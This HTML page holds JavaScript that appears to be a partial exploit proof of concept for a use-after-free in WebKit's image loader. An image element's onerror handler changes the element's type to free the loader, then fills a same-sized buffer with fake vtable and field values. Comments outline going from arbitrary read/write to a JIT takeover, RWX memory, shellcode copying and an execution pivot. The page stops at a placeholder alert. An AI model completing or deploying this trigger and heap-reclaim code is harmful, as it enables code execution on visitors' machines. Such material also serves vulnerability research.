<html>
<body>
<script>
function UaF(a){
    //a = document.getElementById("x");
    //free event:

    //lets talk stack: 
    //1AB00000-1AC00000

    //UAF -> arb r/w
    //x[0] = mem[0]
    //x[1] = mem[1]
    //x[...] = mem[...]


    //dummy stack:
    //NOP 
    //NOP
    //...
    //NOP

    //part 1: take over jit -> use it to map rwx 
    //part 2: loop for data copying -> copy code into rwx
    //part 3: pivot execution into our code

    a.type="radio";

    var t = new DataView(new ArrayBuffer(sizeWebCoreImageLoader));

    t.setUint32(0x00, 0xdeadbeef); //vtable
	t.setUint32(0x04, 0x0dadcafe); //m_client
	t.setUint32(0x08, 0xefbeadde); //m_image
	t.setUint32(0x0C, 0x44444444); //m_failedLoadURL
	t.setUint32(0x10, 0x45454545); //padding
	t.setUint32(0x14, 0x46464646);
	t.setUint32(0x18, 0x47474747);

    //halt before render:
    alert("prerender");
}
</script>
<input id="x" type="image" onerror="UaF(this);" src="" />
</body>
</html> 